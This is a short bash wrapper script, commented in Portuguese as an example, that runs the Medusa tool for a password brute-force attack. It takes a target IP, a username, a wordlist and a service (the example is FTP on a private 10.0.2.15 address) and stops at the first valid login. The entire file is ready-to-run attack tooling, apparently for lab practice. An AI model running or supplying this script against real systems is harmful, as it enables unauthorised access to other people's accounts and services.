#!/bin/bash
# medusa_attack.sh - exemplo de execução do medusa
if [ "$#" -lt 4 ]; then
  echo "Uso: $0 <IP_ALVO> <USUARIO> <WORDLIST> <SERVICO>"
  echo "Ex: $0 10.0.2.15 admin ../wordlists/custom_small.txt ftp"
  exit 1
fi
TARGET=$1
USER=$2
WORDLIST=$3
SERVICE=$4
medusa -h $TARGET -u $USER -P $WORDLIST -M $SERVICE -f
